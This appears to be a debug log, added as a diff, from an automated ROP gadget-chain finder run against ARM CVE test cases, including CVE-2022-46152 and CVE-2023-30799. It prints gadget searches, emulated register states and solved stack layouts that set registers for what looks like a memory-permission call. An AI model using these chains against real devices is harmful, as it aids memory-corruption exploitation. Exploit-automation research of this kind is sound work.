+2026-07-18 08:16:06.983 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db2b844', 'rip': 'sp'}]]
+2026-07-18 08:16:06.991 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db2b844', 'rip': 'sp'}]]
+2026-07-18 08:16:07.039 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:07.042 | DEBUG    | solve_engine:check:1627 - ['pop {r2, r6, r7, pc}']
+2026-07-18 08:16:07.042 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 7, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481940, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:07.046 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r2 [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db22346', 'rip': 'sp'}]]
+2026-07-18 08:16:07.047 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db22346']
+2026-07-18 08:16:07.048 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r2, r5, r7, pc}
+2026-07-18 08:16:07.057 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132'], ['0x8db12578'], ['0x8db09e6c']], 'r1': [['0x8db1f962'], ['0x8db1ede6'], ['0x8db2be20'], ['0x8db09e6c']], 'r2': [['0x8db0b612'], ['0x8db0a3c4'], ['0x8db12578'], ['0x8db1ed72']], 'r3': [['0x8db055c6'], ['0x8db02114'], ['0x8db07f9c'], ['0x8db1ede6']]}
+2026-07-18 08:16:07.166 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:07.169 | DEBUG    | solve_engine:check:1627 - ['pop {r0, r1, r2, r4, pc}']
+2026-07-18 08:16:07.170 | DEBUG    | solve_engine:check:1634 - {'r0': 2406481920, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481944, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:07.173 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r0 [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db22938', 'rip': 'sp'}]]
+2026-07-18 08:16:07.174 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db22938']
+2026-07-18 08:16:07.174 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r0, r2, r3, r7, pc}
+2026-07-18 08:16:07.184 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132'], ['0x8db12578'], ['0x8db09e6c'], ['0x8db1f958']], 'r1': [['0x8db1f962'], ['0x8db1ede6'], ['0x8db2be20'], ['0x8db09e6c']], 'r2': [['0x8db0b612'], ['0x8db0a3c4'], ['0x8db12578'], ['0x8db1ed72']], 'r3': [['0x8db055c6'], ['0x8db02114'], ['0x8db07f9c'], ['0x8db1ede6']]}
+2026-07-18 08:16:07.218 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db00a50', 'rip': 'sp'}]]
+2026-07-18 08:16:07.261 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db00a50', 'rip': 'sp'}]]
+2026-07-18 08:16:07.265 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db1cbb6', 'rip': 'sp'}]]
+2026-07-18 08:16:07.269 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db1cbb6', 'rip': 'sp'}]]
+2026-07-18 08:16:07.383 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db00a50', 'rip': 'sp'}]]
+2026-07-18 08:16:07.500 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db00a50', 'rip': 'sp'}]]
+2026-07-18 08:16:07.643 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db30414', 'rip': 'sp'}]]
+2026-07-18 08:16:07.655 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db30414', 'rip': 'sp'}]]
+2026-07-18 08:16:07.862 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:07.866 | DEBUG    | solve_engine:check:1627 - ['pop {r0, r5, pc}']
+2026-07-18 08:16:07.867 | DEBUG    | solve_engine:check:1634 - {'r0': 2406481920, 'r1': 4096, 'r2': 7, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481936, 'lr': 0, 'pc': 2377251170}
+2026-07-18 08:16:07.868 | DEBUG    | solve_engine:check:1627 - ['pop {r1, r4, pc}']
+2026-07-18 08:16:07.869 | DEBUG    | solve_engine:check:1634 - {'r0': 2406481920, 'r1': 4096, 'r2': 7, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481948, 'lr': 0, 'pc': 2377134592}
+2026-07-18 08:16:07.870 | DEBUG    | solve_engine:check:1627 - ['pop {r2, pc}']
+2026-07-18 08:16:07.870 | DEBUG    | solve_engine:check:1634 - {'r0': 2406481920, 'r1': 4096, 'r2': 7, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481956, 'lr': 0, 'pc': 2377130260}
+2026-07-18 08:16:07.872 | DEBUG    | solve_engine:check:1627 - ['pop {r3, pc}']
+2026-07-18 08:16:07.872 | DEBUG    | solve_engine:check:1634 - {'r0': 2406481920, 'r1': 4096, 'r2': 7, 'r3': 10, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481964, 'lr': 0, 'pc': 3735928326}
+2026-07-18 08:16:07.873 | DEBUG    | find_reg_gadget_chain:solve:785 - [32m{7243086: '0x8db0502c', 7243087: '0x8f700000', 7243089: '0x8db1f962', 7243090: '0x1000', 7243092: '0x8db03200', 7243093: '0x7', 7243094: '0x8db02114', 7243095: '0xa', 7243096: '0xdeadbe06'}[0m
+2026-07-18 08:16:07.891 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db09ebc', 'rip': 'sp'}]]
+2026-07-18 08:16:07.944 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db1f958', 'rip': 'sp'}]]
+2026-07-18 08:16:07.981 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:07.982 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db09ebc', 'rip': 'sp'}]]
+2026-07-18 08:16:07.985 | DEBUG    | solve_engine:check:1627 - ['pop {r0, r1, r2, r4, pc}']
+2026-07-18 08:16:07.985 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 4096, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481944, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:07.996 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db1f958', 'rip': 'sp'}]]
+2026-07-18 08:16:08.053 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db01126', 'rip': 'sp'}]]
+2026-07-18 08:16:08.123 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:08.126 | DEBUG    | solve_engine:check:1627 - ['pop {r0, r2, r3, r7, pc}']
+2026-07-18 08:16:08.127 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 0, 'r3': 10, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481944, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:08.132 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db01126', 'rip': 'sp'}]]
+2026-07-18 08:16:08.238 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db00a50', 'rip': 'sp'}]]
+2026-07-18 08:16:08.271 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db00a50', 'rip': 'sp'}]]
+2026-07-18 08:16:08.313 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:08.316 | DEBUG    | solve_engine:check:1627 - ['pop {r2, r5, r7, pc}']
+2026-07-18 08:16:08.317 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 7, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481940, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:08.382 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:08.385 | DEBUG    | solve_engine:check:1627 - ['pop {r0, r2, r3, r7, pc}']
+2026-07-18 08:16:08.385 | DEBUG    | solve_engine:check:1634 - {'r0': 2406481920, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481944, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:09.351 | SUCCESS  | find_reg_gadget_chain:main:1015 - Find Set Registers Gadget Chain!
+2026-07-18 08:16:09.351 | SUCCESS  | find_reg_gadget_chain:main:1017 - Register Time: 8.37468671798706
+2026-07-18 08:16:09.352 | SUCCESS  | find_reg_gadget_chain:main:1020 - [[{7243086: '0x8db0502c', 7243087: '0x8f700000', 7243089: '0x8db1f962', 7243090: '0x1000', 7243092: '0x8db03200', 7243093: '0x7', 7243094: '0x8db02114', 7243095: '0xa', 7243096: '0xdeadbe06'}, [['0x8db0502c'], ['0x8db1f962'], ['0x8db03200'], ['0x8db02114']]]]
+2026-07-18 08:16:09.357 | SUCCESS  | __main__:main:289 - CVE-2022-46152 SUCCESS (10.00s)
+2026-07-18 08:16:09.358 | INFO     | __main__:main:302 - Running total: 2 success, 0 fail
+2026-07-18 08:16:09.358 | INFO     | __main__:main:279 - 
+============================================================
+2026-07-18 08:16:09.358 | INFO     | __main__:main:280 - [3/3] CVE-2023-30799_arm
+2026-07-18 08:16:09.358 | INFO     | __main__:main:281 - ============================================================
+2026-07-18 08:16:09.360 | INFO     | __main__:run_one:73 - Arch: arm32, thumb=False
+2026-07-18 08:16:09.363 | INFO     | __main__:run_one:86 - Loaded 459 gadgets
+2026-07-18 08:16:09.366 | INFO     | __main__:run_one:90 - Memory map: 2 regions, regs: sp=0x41001000
+2026-07-18 08:16:09.367 | INFO     | __main__:run_one:121 - Targets: [('r0', '0x41001500'), ('r1', '0x1000'), ('r2', '0x7'), ('r3', '0xa')]
+2026-07-18 08:16:09.368 | INFO     | __main__:run_one:212 - Stack pivot: sp redirected to 0x41001500, region=0x41001500+1536
+2026-07-18 08:16:09.368 | INFO     | __main__:run_one:219 - offset_list: 383 slots, address_map: {0: '0xdeadbeef'}
+2026-07-18 08:16:09.384 | INFO     | find_reg_gadget_chain:main:953 - Get Set Reg Edges
+2026-07-18 08:16:09.514 | INFO     | find_reg_gadget_chain:main:1002 - Find Reg Setting Gadget Chain
+2026-07-18 08:16:09.515 | INFO     | find_reg_gadget_chain:main:1003 - Target Register ['r0', 'r1', 'r2', 'r3']
+2026-07-18 08:16:10.153 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x0000a05c', 'rip': 'sp'}]]
+2026-07-18 08:16:10.158 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r3 [[{'dst': 'r3', 'src': 'sp', 'addr': '0x0000a05c', 'rip': 'sp'}]]
+2026-07-18 08:16:10.159 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x0000a05c']
+2026-07-18 08:16:10.160 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r3, pc}
+2026-07-18 08:16:10.174 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x0000a05c', 'rip': 'sp'}]]
+2026-07-18 08:16:10.188 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x00012ce4', 'rip': 'sp'}]]
+2026-07-18 08:16:10.191 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x00012ce4', 'rip': 'sp'}]]
+2026-07-18 08:16:10.192 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r1 [[{'dst': 'r1', 'src': 'sp', 'addr': '0x00012ce4', 'rip': 'sp'}]]
+2026-07-18 08:16:10.193 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x00012ce4']
+2026-07-18 08:16:10.194 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r1, pc}
+2026-07-18 08:16:10.711 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x00008b24', 'rip': 'sp'}]]
+2026-07-18 08:16:10.741 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x00008b24', 'rip': 'sp'}]]
+2026-07-18 08:16:10.897 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:10.899 | DEBUG    | solve_engine:check:1627 - ['pop {r3, pc}']
+2026-07-18 08:16:10.899 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 0, 'r3': 10, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524428, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:10.903 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r3 [[{'dst': 'r3', 'src': 'sp', 'addr': '0x00008b24', 'rip': 'sp'}]]
+2026-07-18 08:16:10.904 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x00008b24']
+2026-07-18 08:16:10.905 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r3, r4, r5, pc}
+2026-07-18 08:16:10.928 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:10.932 | DEBUG    | solve_engine:check:1627 - ['pop {r1, pc}']
+2026-07-18 08:16:10.932 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 4096, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524428, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:11.016 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [], 'r1': [], 'r2': [], 'r3': [['0x0000a05c']]}
+2026-07-18 08:16:11.132 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [], 'r1': [['0x00012ce4']], 'r2': [], 'r3': [['0x0000a05c']]}
+2026-07-18 08:16:11.588 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x0000b6fc', 'rip': 'sp'}]]
+2026-07-18 08:16:11.621 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:11.623 | DEBUG    | solve_engine:check:1627 - ['pop {r3, r4, r5, pc}']
+2026-07-18 08:16:11.624 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 0, 'r3': 10, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524436, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:11.625 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x0000b6fc', 'rip': 'sp'}]]
+2026-07-18 08:16:11.628 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r3 [[{'dst': 'r3', 'src': 'sp', 'addr': '0x0000b6fc', 'rip': 'sp'}]]
+2026-07-18 08:16:11.629 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x0000b6fc']
+2026-07-18 08:16:11.629 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r3, r4, r5, r6, r7, pc}
+2026-07-18 08:16:11.731 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [], 'r1': [['0x00012ce4']], 'r2': [], 'r3': [['0x0000a05c'], ['0x00008b24']]}
+2026-07-18 08:16:12.350 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:12.353 | DEBUG    | solve_engine:check:1627 - ['pop {r3, r4, r5, r6, r7, pc}']
+2026-07-18 08:16:12.353 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 0, 'r3': 10, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524444, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:12.454 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [], 'r1': [['0x00012ce4']], 'r2': [], 'r3': [['0x0000a05c'], ['0x00008b24'], ['0x0000b6fc']]}
+2026-07-18 08:16:12.535 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x0001066c', 'rip': 'sp'}]]
+2026-07-18 08:16:12.539 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r3 [[{'dst': 'r3', 'src': 'sp', 'addr': '0x0001066c', 'rip': 'sp'}]]
+2026-07-18 08:16:12.540 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x0001066c']
+2026-07-18 08:16:12.540 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r3, r4, r5, r6, r7, r8, sb, pc}
+2026-07-18 08:16:12.560 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x0001066c', 'rip': 'sp'}]]
+2026-07-18 08:16:13.319 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:13.321 | DEBUG    | solve_engine:check:1627 - ['pop {r3, r4, r5, r6, r7, r8, sb, pc}']
+2026-07-18 08:16:13.322 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 0, 'r3': 10, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524452, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:13.427 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [], 'r1': [['0x00012ce4']], 'r2': [], 'r3': [['0x0000a05c'], ['0x00008b24'], ['0x0000b6fc'], ['0x0001066c']]}
+2026-07-18 08:16:14.709 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[[[{'dst': 'r4', 'src': 'sp', 'addr': '0x00008c28', 'rip': 'sp'}], [{'dst': 'r4', 'src': 'sp', 'addr': '0x00008dec', 'rip': 'sp'}], [{'dst': 'r4', 'src': 'sp', 'addr': '0x00008b24', 'rip': 'sp'}], [{'dst': 'r4', 'src': 'sp', 'addr': '0x0000ac90', 'rip': 'sp'}], [{'dst': 'r4', 'src': 'sp', 'addr': '0x00009f70', 'rip': 'sp'}], [{'dst': 'r4', 'src': 'sp', 'addr': '0x0000a7d4', 'rip': 'sp'}], [{'dst': 'r4', 'src': 'sp', 'addr': '0x0000b6fc', 'rip': 'sp'}], [{'dst': 'r4', 'src': 'sp', 'addr': '0x0000ea88', 'rip': 'sp'}]], {'dst': 'r0', 'src': 'r4', 'addr': '0x0000a2a8', 'rip': 'sp'}]]
+2026-07-18 08:16:14.713 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r0 [[[[{'dst': 'r4', 'src': 'sp', 'addr': '0x00008c28', 'rip': 'sp'}], [{'dst': 'r4', 'src': 'sp', 'addr': '0x00008dec', 'rip': 'sp'}], [{'dst': 'r4', 'src': 'sp', 'addr': '0x00008b24', 'rip': 'sp'}], [{'dst': 'r4', 'src': 'sp', 'addr': '0x0000ac90', 'rip': 'sp'}], [{'dst': 'r4', 'src': 'sp', 'addr': '0x00009f70', 'rip': 'sp'}], [{'dst': 'r4', 'src': 'sp', 'addr': '0x0000a7d4', 'rip': 'sp'}], [{'dst': 'r4', 'src': 'sp', 'addr': '0x0000b6fc', 'rip': 'sp'}], [{'dst': 'r4', 'src': 'sp', 'addr': '0x0000ea88', 'rip': 'sp'}]], {'dst': 'r0', 'src': 'r4', 'addr': '0x0000a2a8', 'rip': 'sp'}]]
+2026-07-18 08:16:14.714 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x00008c28', '0x0000a2a8']
+2026-07-18 08:16:14.714 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r4, pc}
+2026-07-18 08:16:14.714 | DEBUG    | find_reg_gadget_chain:monitor:666 - mov r0, r4 ; pop {r4, pc}
+2026-07-18 08:16:15.655 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[[[{'dst': 'r5', 'src': 'sp', 'addr': '0x00008dec', 'rip': 'sp'}], [{'dst': 'r5', 'src': 'sp', 'addr': '0x00008b24', 'rip': 'sp'}], [{'dst': 'r5', 'src': 'sp', 'addr': '0x0000ac90', 'rip': 'sp'}], [{'dst': 'r5', 'src': 'sp', 'addr': '0x00009f70', 'rip': 'sp'}], [{'dst': 'r5', 'src': 'sp', 'addr': '0x0000a7d4', 'rip': 'sp'}], [{'dst': 'r5', 'src': 'sp', 'addr': '0x0000b6fc', 'rip': 'sp'}], [{'dst': 'r5', 'src': 'sp', 'addr': '0x0000ea88', 'rip': 'sp'}], [{'dst': 'r5', 'src': 'sp', 'addr': '0x0000b3c8', 'rip': 'sp'}]], {'dst': 'r2', 'src': 'r5', 'addr': '0x0000c968', 'rip': 'sp'}]]
+2026-07-18 08:16:15.660 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r2 [[[[{'dst': 'r5', 'src': 'sp', 'addr': '0x00008dec', 'rip': 'sp'}], [{'dst': 'r5', 'src': 'sp', 'addr': '0x00008b24', 'rip': 'sp'}], [{'dst': 'r5', 'src': 'sp', 'addr': '0x0000ac90', 'rip': 'sp'}], [{'dst': 'r5', 'src': 'sp', 'addr': '0x00009f70', 'rip': 'sp'}], [{'dst': 'r5', 'src': 'sp', 'addr': '0x0000a7d4', 'rip': 'sp'}], [{'dst': 'r5', 'src': 'sp', 'addr': '0x0000b6fc', 'rip': 'sp'}], [{'dst': 'r5', 'src': 'sp', 'addr': '0x0000ea88', 'rip': 'sp'}], [{'dst': 'r5', 'src': 'sp', 'addr': '0x0000b3c8', 'rip': 'sp'}]], {'dst': 'r2', 'src': 'r5', 'addr': '0x0000c968', 'rip': 'sp'}]]
+2026-07-18 08:16:15.661 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x00008dec', '0x0000c968']
+2026-07-18 08:16:15.661 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r4, r5, pc}
+2026-07-18 08:16:15.661 | DEBUG    | find_reg_gadget_chain:monitor:666 - ldr r2, [r5] ; ldr r3, [r4, #4] ; str r2, [r3], #4 ; str r3, [r4, #4] ; pop {r4, r5, r6, pc}
+2026-07-18 08:16:16.378 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:16.380 | DEBUG    | solve_engine:check:1627 - ['pop {r4, pc}']
+2026-07-18 08:16:16.381 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 1090524416, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524428, 'lr': 0, 'pc': 41640}
+2026-07-18 08:16:16.382 | DEBUG    | solve_engine:check:1627 - ['mov r0, r4', 'pop {r4, pc}']
+2026-07-18 08:16:16.383 | DEBUG    | solve_engine:check:1634 - {'r0': 1090524416, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524436, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:16.385 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x00008dec', '0x0000a2a8']
+2026-07-18 08:16:16.385 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r4, r5, pc}
+2026-07-18 08:16:16.385 | DEBUG    | find_reg_gadget_chain:monitor:666 - mov r0, r4 ; pop {r4, pc}
+2026-07-18 08:16:16.465 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x00008c28', '0x0000a2a8']], 'r1': [['0x00012ce4']], 'r2': [], 'r3': [['0x0000a05c'], ['0x00008b24'], ['0x0000b6fc'], ['0x0001066c']]}
+2026-07-18 08:16:17.345 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:17.348 | DEBUG    | solve_engine:check:1627 - ['pop {r4, r5, pc}']
+2026-07-18 08:16:17.348 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 2147418112, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524432, 'lr': 0, 'pc': 51560}
+2026-07-18 08:16:17.353 | DEBUG    | solve_engine:check:1627 - ['ldr r2, [r5]', 'ldr r3, [r4, #4]', 'str r2, [r3], #4', 'str r3, [r4, #4]', 'pop {r4, r5, r6, pc}']
+2026-07-18 08:16:17.353 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 7, 'r3': 4, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524448, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:17.355 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x00008b24', '0x0000c968']
+2026-07-18 08:16:17.355 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r3, r4, r5, pc}
+2026-07-18 08:16:17.355 | DEBUG    | find_reg_gadget_chain:monitor:666 - ldr r2, [r5] ; ldr r3, [r4, #4] ; str r2, [r3], #4 ; str r3, [r4, #4] ; pop {r4, r5, r6, pc}
+2026-07-18 08:16:17.654 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x00008c28', '0x0000a2a8']], 'r1': [['0x00012ce4']], 'r2': [['0x00008dec', '0x0000c968']], 'r3': [['0x0000a05c'], ['0x00008b24'], ['0x0000b6fc'], ['0x0001066c']]}
+2026-07-18 08:16:18.072 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:18.074 | DEBUG    | solve_engine:check:1627 - ['pop {r4, r5, pc}']
+2026-07-18 08:16:18.074 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 1090524416, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 1090524432, 'lr': 0, 'pc': 41640}
+2026-07-18 08:16:18.076 | DEBUG    | solve_engine:check:1627 - ['mov r0, r4', 'pop {r4, pc}']
